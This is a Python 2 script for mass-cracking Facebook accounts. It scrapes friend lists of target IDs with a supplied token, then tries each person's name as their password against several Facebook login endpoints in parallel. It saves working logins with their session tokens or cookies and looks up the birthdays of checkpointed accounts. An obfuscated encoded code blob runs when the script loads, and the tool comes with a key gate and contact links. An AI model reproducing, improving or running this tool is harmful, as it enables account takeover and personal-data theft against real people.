# DECOMPILED BY RED-MAFIA
# DONT MESS WITH ME

Hj = '\x1b[0;37m' 
Mt = '\x1b[0;37m' 
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s Removing token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def folder():
	try:os.mkdir('hasil')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO 
def banner():
	print '\x1b[0;37m\n\n ########  ########     ###\n ##     ## ##     ##   ## ## \n ##     ## ##     ##  ##   ##\n \x1b[0;35m########  \x1b[0;35m########  \x1b[0;37m##     ## \n ##     ## ##     ## \x1b[0;35m######### \n \x1b[0;37m##     ## ##     ## ##     ## \n ########  ########  ##     ## '
	print '\x1b[0;37m\n-------------------------------\n \x1b[0;37m  Authur  : RED-MAFIA \n \x1b[0;37m  Whatsap : +923188214452 \n \x1b[0;37m  Status  : Free Version  \n\x1b[0;37m-------------------------------\x1b[0;32m'
# TOKEN 
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print '\x1b[0;37m\n [1].  Login via token \n [0].  Out'
    mubashar = raw_input ('\n\x1b[0;37m Choose  ')
    if mubashar in(""):
    	print '\x1b[0;37m Roung Input  ';exit()
    elif mubashar in ('1','01'):
        print '\x1b[0;37m\n   '
    	romz = raw_input('\x1b[0;37m Token  ')
        if romz in(""):
        	print '\x1b[0;37m Roung Input ';exit()
    	try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print '\n\x1b[0;32m Login Successful, '
            open('token.txt', 'w').write(romz);menu()
            os.system("xdg-open https://www.facebook.com/MUB4SH4R")
        except (KeyError,IOError):
        	print('\x1b[0;37m Token invalid ');masuk()
    
    elif mubashar in ('0', '00'):
    	exit('\n')
    else:
    	print '\x1b[0;37m Roung Input ';exit()
		
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
        idt = raw_input('\n \x1b[0;37m Target id  ')
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r\x1b[0;37m  Collecting id %s %s ' % (H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)
        bff.close()
        print '\n\x1b[0;37m\n-------------------------------'
        print ('  Copy File %s %s '%(H,file))
        print '\x1b[0;37m-------------------------------'
        raw_input('\n\x1b[0;32m  Press to go back   ')
        menu()
    except Exception as e:
        exit('\n \x1b[0;33m Not Found dump id')

# 》KEY 》

def key():
		os.system("clear")
		banner()
		print('')
		print('')
		sp = raw_input("\x1b[0;35m    \x1b[0;35m \x1b[0;35mKey :\x1b[0;36m ")
		if sp =="BALOCH":
			print("")
			time.sleep(3)
			print("\x1b[0;32m         \x1b[0;32mCorrect")
			print("")
			os.system('xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi')
			time.sleep(2)
			menu()
		else:
			print("")
			time.sleep(1)
			print("\x1b[0;33m           \x1b[0;33mInvalid")
			print("")
			os.system('xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi')
			time.sleep(3)
			key()

# START CRACK
class ngentod:

    def __init__(self):
        self.id = []
    def romiy(self):
        try:
            self.apk = raw_input('\n \x1b[0;37mPut file ')
            self.id = open(self.apk).read().splitlines()
            print '\x1b[0;37m\n-------------------------------'
            print '   \x1b[0;37mTotal id  %s%s' %(H,len(self.id))
        except:
            print '\n\x1b[0;37m File dump Not Found, Try Again'
            raw_input('\n\x1b[0;33m Press enter to go back  ');menu()
            print '\x1b[0;37m-------------------------------'
        unikers = raw_input('\n \x1b[0;37m Want Start Cracking?[s/N] ')
        if unikers in ('N', 'n'):
        	os.system("xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi")
        elif unikers in ('S', 's'):
            print '\x1b[0;37m\n-------------------------------\x1b[0;32m\n   Choose methode crack bro  \x1b[0;37m\n-------------------------------'
            print '\n\x1b[0;35m [1].  \x1b[0;37mMethod b-api (\x1b[0;32mFast\x1b[0;37m)'
            print '\x1b[0;35m [2].  \x1b[0;37mMethod mbasic (\x1b[0;32mSlow\x1b[0;37m)'
            print '\x1b[0;35m [3].  \x1b[0;37mMethod mobile (\x1b[0;32mFor Ok IDS\x1b[0;37m) '
            self.langsung()
        else:
            print("\x1b[0;33m  Roung Input bro ");menu()
    def langsung(self):
        baloch = raw_input('\n \x1b[0;37m Methode  ')
        if baloch == '':
            print("\x1b[0;33m  Roung Input  ");self.langsung()
        elif baloch in ('1', '01'):
            print '\x1b[0;37m\n-------------------------------\n \x1b[0;35mPlease wait Started Cloning\n \x1b[0;35mUse airplane mode before use\n\x1b[0;37m------------------------------- '
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name]
                        else:
                            pwx = [name]
                        log.submit(self.b_api, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif baloch in ('2', '02'):
            print '\x1b[0;37m\n-------------------------------\n \x1b[0;35mPlease wait Started Cloning\n \x1b[0;35mUse airplane mode before use\n\x1b[0;37m------------------------------- '
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name]
                        else:
                            pwx = [name]
                        log.submit(self.basic, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        elif baloch in ('3', '03'):
            print '\x1b[0;37m\n-------------------------------\n \x1b[0;35mPlease wait Started Cloning\n \x1b[0;35mUse airplane mode before use\n\x1b[0;37m------------------------------- '
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name]
                        else:
                            pwx = [name]
                        log.submit(self.mobil, uid, pwx)
                    except: pass
            os.remove(self.apk);exit()
        else:
            print("\n\x1b[0;33m Roung Input ");self.langsung()
    def b_api(self, user, zona):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	loop +=1
            	print ("\r\033[0;91m [!] IP "),
                sys.stdout.flush()
                b_api(self, user, zona)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r%s\x1b[0;36m[\x1b[0;35mok-bba\x1b[0;36m] %s \x1b[0;36m• %s \x1b[0;36m• %s ' % (H,user,pw,response.json()['access_token'])
                ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
                open('Acount/Ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [ok-bba] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s \x1b[0;36m• %s %s %s  ' % (K,user,pw,day,month,year)
                    cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                    open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [cp-bba] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s           ' % (K,user,pw)
                cp.append('%s • %s' % (user,pw))
                open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [cp-bba] %s • %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m'])
        print('\r%s[*] [BBA] %s/%s [ok]-%s [cp]-%s '%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def basic(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s\x1b[0;36m[\x1b[0;35mok-bba\x1b[0;36m] %s • %s \x1b[0;36m• %s  ' % (H,user,pw,kuki)
                ok.append("%s • %s • %s"% (user,pw,kuki))
                open('Acount/Ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [ok-bba] %s • %s • %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s \x1b[0;36m• %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                    open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [cp-bba] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s            ' % (K,user,pw)
                cp.append("%s • %s"% (user,pw))
                open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [cp-bba] %s • %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m'])
        print('\r%s[*] [BBA] %s/%s [ok]-%s [cp]-%s '%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    def mobil(self, user, zona):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for rom in b('input'):
            	if rom.get('value') is None:
            	    if rom.get('name') == 'email':
            	        data.update({"email":user})
                    elif rom.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({rom.get('name'): ''})
                else:
                	data.update({rom.get('name'): rom.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s\x1b[0;36m[\x1b[0;35mok-bba\x1b[0;36m] %s \x1b[0;36m• %s \x1b[0;36m• %s ' % (H,user,pw,kuki)
                ok.append("%s • %s • %s"% (user,pw,kuki))
                open('Acount/Ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [ok-bba] %s • %s • %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s \x1b[0;36m• %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                    open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [cp-bba] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r%s\x1b[0;36m[\x1b[0;35mcp-bba\x1b[0;36m] %s \x1b[0;36m• %s              ' % (K,user,pw)
                cp.append("%s • %s"% (user,pw))
                open('Acount/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" %s • %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m', '\x1b[0;37m'])
        print('\r%s[*] [BBA] %s/%s [ok]-%s [cp]-%s '%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()

# MENU
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print '\x1b[0;37m  Token invalid ';os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print '\x1b[0;37m  Token invalid ';os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit('  Internet Eror ')
    banner()
    print '\x1b[0;35m\n [1].  \x1b[0;37mExtract file from public '
    print '\x1b[0;35m [2].  \x1b[0;37mStart file crack '
    print '\x1b[0;35m [3].  \x1b[0;37mContact Owner'
    print '\x1b[0;35m [0].  \x1b[0;37mLogout token '
    bba = raw_input('\n   \x1b[0;36mChoose  \x1b[0;37m')
    if bba == '':
        print '\x1b[0;36m  Roung Input  ';menu()
    elif bba in['1','01']:
        publik(romz)
    elif bba in['2','02']:
        ngentod().romiy()
    elif bba in['3','03']:
        os.system("xdg-open https://chat.whatsapp.com/KmWJuOGRgVdHrDpMAFaOVi")
    elif bba in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        print '\x1b[0;36m\n  Removed Token ';exit()
    else:
        print '\x1b[0;36m  Roung Input';menu()


if __name__ == '__main__':
    os.system('git pull')
    folder()
    key()
    menu()    

